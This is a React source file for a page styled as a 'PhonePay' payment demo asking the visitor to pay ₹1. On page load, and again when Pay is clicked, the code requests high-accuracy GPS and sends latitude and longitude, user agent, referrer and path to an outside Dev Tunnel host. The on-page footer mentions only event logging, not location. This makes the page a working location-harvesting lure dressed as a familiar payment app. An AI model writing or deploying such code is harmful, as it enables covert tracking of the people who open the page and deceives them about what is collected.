import React, { useEffect } from "react";
import "./App.css";

// Dev Tunnel backend URL
const BACKEND_URL = "https://300w2zzm-4000.inc1.devtunnels.ms";

// Send log to backend
async function sendLog(action, extra = {}) {
  await fetch(`${BACKEND_URL}/log`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      action,
      path: window.location.pathname + window.location.search,
      userAgent: navigator.userAgent,
      referrer: document.referrer,
      timestamp: new Date().toISOString(),
      ...extra,
    }),
  }).catch((err) => console.error("Failed to send log", err));
}

export default function App() {
  useEffect(() => {
    // Try to get precise GPS location
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          sendLog("open", {
            latitude: pos.coords.latitude,
            longitude: pos.coords.longitude,
          });
        },
        (err) => {
          console.warn("Location denied or unavailable, falling back:", err);
          sendLog("open"); // fallback if denied
        },
        { enableHighAccuracy: true }
      );
    } else {
      sendLog("open"); // fallback if browser doesn't support
    }
  }, []);

  const handlePayClick = () => {
    // Also try to get location when user clicks Pay
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          sendLog("click_pay", {
            amount: "₹1",
            latitude: pos.coords.latitude,
            longitude: pos.coords.longitude,
          });
        },
        () => {
          sendLog("click_pay", { amount: "₹1" });
        },
        { enableHighAccuracy: true }
      );
    } else {
      sendLog("click_pay", { amount: "₹1" });
    }

    alert("Simulated payment — logged on backend!");
  };

  return (
    <div className="container">
      <div className="card">
        <div className="logo">PP</div>
        <h1>PhonePay — Demo</h1>
        <p>Fast, secure, and simple payments.</p>

        <div style={{ margin: "1.5rem 0" }}>
          <h2>₹1</h2>
          <p>To: Demo Merchant</p>
        </div>

        <button onClick={handlePayClick}>Pay ₹1</button>

        <div className="footer">
          Logs “open” when page loads and “click_pay” when you click Pay.
        </div>
      </div>
    </div>
  );
}
